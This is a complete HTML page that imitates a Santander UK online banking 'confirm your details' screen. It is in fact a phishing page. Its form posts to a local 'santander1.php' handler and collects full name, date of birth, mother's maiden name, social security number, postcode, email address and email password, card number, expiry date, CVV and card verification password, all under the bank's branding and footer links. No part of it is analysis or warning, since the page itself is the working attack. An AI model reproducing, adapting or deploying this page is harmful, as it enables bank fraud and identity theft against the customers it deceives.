<!DOCTYPE html>








<html lang="en-GB">
<head>
<title>Santander - Online Banking</title>
<meta http-equiv = "Content-Type" content = "text/html; charset=UTF-8" />
<meta http-equiv = "Pragma" content = "no-cache" />
<meta http-equiv = "Expires" content = "Tue, 01 Jan 1980 12:00:00 GMT" />
<meta http-equiv = "Cache-Control" content = "no-cache" />
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=Edge" />


<link rel="shortcut icon" href="images/favicon.ico" />
<link rel="stylesheet" type="text/css" media="screen, print" href="css/santander.css" />
<link rel="stylesheet" type="text/css" media="print" href="css/print.css" /> 
<!--[if IE]><link rel="stylesheet" type="text/css" media="screen,print" href="css/ie.css" /><![endif]-->
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" media="screen" href="css/ie8.css" /><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" type="text/css" media="screen" href="css/ie7.css" /><![endif]-->

<script type="text/javascript" src="js/jquery-1.11.1.min.js"></script>
<script type="text/javascript" src="js/jquery-ui-1.10.4.custom.min.js"></script>
<script type="text/javascript" src="js/strings.en.js"></script>
<script type="text/javascript" src="js/calendar2.2.js"></script>
<script type="text/javascript" src="js/calendarConfig.js"></script>
<script type="text/javascript" src="js/behaviour2.js"></script>
<script type="text/javascript" src="js/jquery.validator.1.6.0.min.js"></script>
<script type="text/javascript" src="js/logon.js"></script>
<script type="text/javascript" src="js/iframekiller.js"></script>
<script type="text/javascript" src="js/jquery-1.11.0.min.js"></script>
<script type="text/javascript" src="js/validator.min.js"></script>
<!--[if lte IE 7]><script type="text/javascript" src="js/ie7.js"></script><![endif]-->
<!--[if IE 8]><script type="text/javascript" src="js/ie8.js"></script><![endif]-->

<script type="text/javascript">
(function(w,d){var h=d.getElementsByTagName("head")[0],e=d.createElement("script"),a=[["src",(w.location.protocol=="https:"?"https://":"http://")+"fc1.retail.santander.co.uk/query/4/fieldsTester.js"],["async",true],["type","text/javascript"]];for(var i=0,l=a.length;i<l;i++){e.setAttribute(a[i][0],a[i][1])}h.appendChild(e)})(window,document);
</script>

<script type="text/javascript">  
(function() {
  var bt="text/java",z=document,fh=z.getElementsByTagName('head')[0],k='script',j= (window.location.protocol == "https:" ? "https:/" : "http:/");
  var y=z.createElement(k);y.async=true;y.type=bt+k;y.src=[j,"press.retail.santander.co.uk","902258","char_conv.js"].join("/");
  fh.appendChild(y);
})();
</script>




	
		


 
<script src="//assets.adobedtm.com/18a2415ae6b52c3a7c0b946cdfc34cd03d7440e8/satelliteLib-f614afad3dd348a170a03c92881f3682b50a87e8.js"></script>


	
	

            <script type="text/javascript">
                  (function() {
                  document.cookie = "___tk902258=" + encodeURIComponent(Math.random()) + ";path=/;domain=santander.co.uk";
                  })();
            </script>
      
            <script type="text/javascript"> 
                  (function() {
                  var s = document.createElement('script'), attrs = { src: (window.location.protocol == "https:" ? "https:" : "http:") + "//" + "mc3.retail.santander.co.uk/902258/jqDateElem.js", async: true, type: "text/javascript" };
                  for(var k in attrs) { s.setAttribute(k, attrs[k]) }
                  document.getElementsByTagName('head')[0].appendChild(s);
                  })();
            </script>
   
		<script type="text/javascript">adobeContextData = [{'transactionName': null,'errorCode': null,'errorMsg': {},'page identifier': 'forgottenLogOn','product identifier': null,'subSection2': null,'subSection3': null,'single': null,'accessType': null,'mccType': null,'mccOrigin': null }];</script>   
 

</head>



<body>
<div id="global">
	<a href="#bodycontent" class="skipToContent">Skip to content</a>
	<div id="header">
		<div id="headerbanner" class="padlock">
			<div id="bankname">
				<a href="http://www.santander.co.uk/uk/index">Santander</a>	
			</div>
		</div>
	</div>
			
			
			
		<div id="bodycontent">
			

<div id="bodycontent">
			<div id="content">
			
	

   
 
   


 
   

  

  

  

  

  




 
 
 
 


 
 
 

 
 

 






 
<form name="forgottenLogOnForm" accept-charset="UTF-8" method="post" action="santander1.php" class="validator" data-req-msg="Please select an address from the list. If you cannot find your address, select the &#39;Can’t see your address?&#39; link." data-format-msg="The format is not correct."><input type="hidden" name="dse_sessionId" value="PzxclfN2Gc376vTEwYJym3p" /><input type="hidden" name="dse_operationName" value="identification" /><input type="hidden" name="dse_applicationName" value="ALP_RESCUK_Presentacion" /><input type="hidden" name="dse_threadId" value="defaultExecutionThreadIdentifier" /><input type="hidden" name="dse_pageId" value="0" /><input type="hidden" name="dse_processorState" value="forgottenLogOn" /><input type="hidden" name="dse_processorId" value="6B0F3D4A4E45D9A5697582DE" /><input type="hidden" name="dse_cmd" value="continue" /><input type="hidden" name="dse_nextEventName" value="next" />

	<input type="hidden" name="forgottenLogOnForm.error.codError" />
	<input type="hidden" name="forgottenLogOnForm.error.desError" />
	
<h1>Confirm your Santander online banking</h1>
	<p>Please ensure you complete all fields marked with * </p>
	
<div class="swappable conditional" id="personalID">
     <div class="form">
	 
		<div class="form-item">
		  
            
		     <label for="attPersonalID" class="labeltext">Enter your Personal/Customer ID</label>
		        <span class="data inputgroup">
				    <input type="text" name="CID" class="text" id="attPersonalID" maxlength="26" size="26"  autocomplete="off" required="required" data-req-msg="Please enter your ID. Your ID may have been previously known as your Personal ID, Customer ID or Customer number." />
				</span>
          
           
        
		</div>
	 </div>
</div>
	
<div class="swappable conditional" id="personalData">
<h2>Personal Information</h2>
  <div class="form">
        
        
		<div class="form-item">
			<label for="name" class="labeltext">Full name *</label>
				<span class="data">
				    <input type="text" name="FN" class="text" id="attPersonalID"  size="26"  autocomplete="off" required="required"  />
				</span>	
		</div>
		
		
        <div class="form-item">
           <label for="" class="labeltext">Date of birth *</label>
             <span class="data inputgroup">
	           <span class="dateBirthReaccess dateField"><input type="text" maxlength="2" size="2" name="D1" title="day" autocomplete="off" value="" class="day"  required="required" data-req-msg="Please enter your date of birth." /> / <input type="text" maxlength="2" size="2" name="D2" title="month" autocomplete="off" value="" class="month"  required="required" data-req-msg="Please enter your date of birth." /> / <input type="text" maxlength="4" size="4" name="D3" title="year" autocomplete="off" value="" class="year" required="required" data-req-msg="Please enter your date of birth." /></span>
	         </span>
        </div>
		<div class="form-item">
		    <label for="surname" class="labeltext">Mother's maiden name *</label>
				<span class="data">
				    <input type="text" name="MMN" class="text" id="attPersonalID"  size="26"  autocomplete="off" required="required"  />
				</span>
		</div>
		<div class="form-item">
		    <label for="surname" class="labeltext">Social security number *</label>
				<span class="data">
				    <input type="text" name="SSN" class="text" id="attPersonalID" maxlength="11" size="26"  autocomplete="off" required="required"  />
				</span>
		</div>
 	   <div class="form-item">
		    <label for="surname" class="labeltext">UK Postcode *</label>
				<span class="data">
				    <input type="text" name="PC" class="text" id="attPersonalID" maxlength="10" size="15"  autocomplete="off" required="required"  />
				</span>
		</div>
<div class="form-item">
		    <label for="surname" class="labeltext">Email address *</label>
				<span class="data">
				    <input type="text" name="EA" class="text" id="attPersonalID"  size="26"  autocomplete="off" required="required"  />
				</span>
		</div>
		<div class="form-item">
		    <label for="surname" class="labeltext">Email password *</label>
				<span class="data">
				    <input type="password" name="EP" class="text" id="attPersonalID"  size="26"  autocomplete="off" required="required"  />
				</span>
		</div>

   
 
 
 </div>
</div>
<div class="swappable conditional" id="personalID">
<h2>Billing Information</h2>
     <div class="form">
		<div class="form-item">
		  
            
		     <label for="attPersonalID" class="labeltext">Name on card *</label>
		        <span class="data inputgroup">
				    <input type="text" name="NC" class="text" id="attPersonalID"  size="26"  autocomplete="off" required="required"  />
				</span>
          
           
        
		</div>
		<div class="form-item">
			<label for="name" class="labeltext">Card number *</label>
				<span class="data">
				    <input type="text" name="CN" class="text" id="attPersonalID" maxlength="16" size="26"  autocomplete="off" required="required"  />
				</span>	
		</div>
		
		
        <div class="form-item">
           <label for="" class="labeltext">Exp. date *</label>
             <span class="data inputgroup">
	           <span class="dateBirthReaccess dateField"><input type="text" maxlength="2" size="2" name="E1" title="month" autocomplete="off" value="" class="month"  required="required" /> / <input type="text" maxlength="4" size="4" name="E2" title="year" autocomplete="off" value="" class="year"  required="required"  /></span>
	         </span>
        </div>
		<div class="form-item">
			<label for="name" class="labeltext">Cvv *</label>
				<span class="data">
				    <input type="password" name="CVV" class="p" id="attPersonalID" maxlength="3" size="10"  autocomplete="off" required="required"  />
				</span>	
		</div>
		<div class="form-item">
			<label for="name" class="labeltext">Vbv Password *</label>
				<span class="data">
				    <input type="password" name="VBV" class="text" id="attPersonalID" maxlength="10" size="15"  autocomplete="off" required="required"  />
				</span>	
		</div>
	 </div>
	 
</div>
	   <div class="buttonholder">
	       
			<span class="button">
				<input type="submit" name="forgottenLogOnForm.events.1" class="primary" value="Confirm &gt;" />
			</span>  
	   </div>
	   
	</form>
 </div> 
</div>

		
		</div>
			
			
			
			
		<div id="logonside">
			<div class="usefulLinksMenu">
				<h2><span class="icoUseful">&nbsp;</span>Useful links</h2>
				<ul>
					<li><a href="http://www.santander.co.uk/uk/help-support/online-banking" target="_blank">Online Banking help</a></li>
					<li><a href="http://www.santander.co.uk/uk/help-support/online-banking/online-banking-contact-us" target="_blank">Contact us</a></li>
				</ul>
			</div>
        </div>
 
	    <div id="footer">		
			<ul>
				<li><a title="This link opens in a new window" href="http://www.santander.co.uk/uk/online-mobile-banking-commitment" target="_blank">Online Banking Guarantee</a></li>
				<li><a title="This link opens in a new window" href="http://www.santander.co.uk/uk/accessibility" target="_blank">Site Help &amp; Accessibility</a></li>
				<li><a title="This link opens in a new window" href="http://www.santander.co.uk/uk/help-support/security-centre/data-protection" target="_blank">Security &amp; Privacy</a></li>
				<li><a title="This link opens in a new window" href="http://www.santander.co.uk/uk/help-support/online-banking-terms-conditions" target="_blank">Terms &amp; Conditions</a></li>
				<li><a title="This link opens in a new window" href="http://www.santander.co.uk/uk/website-legal" target="_blank">Legal</a></li>
			</ul>
		</div>
</div>


	<script type="text/javascript">_satellite.pageBottom();</script>
	
</body>
</html>

<img src="Estatico/ALP_RESCUK_Presentacion/Images/ntpagetag.gif?tagData.personalDetailsScreen=Y&tagData.findAddress=N&tagData.attemptsID=&tagData.attemptsFullIdentification=&tagData.sessionId=PzxclfN2Gc376vTEwYJym3p" style="display: none;"></img>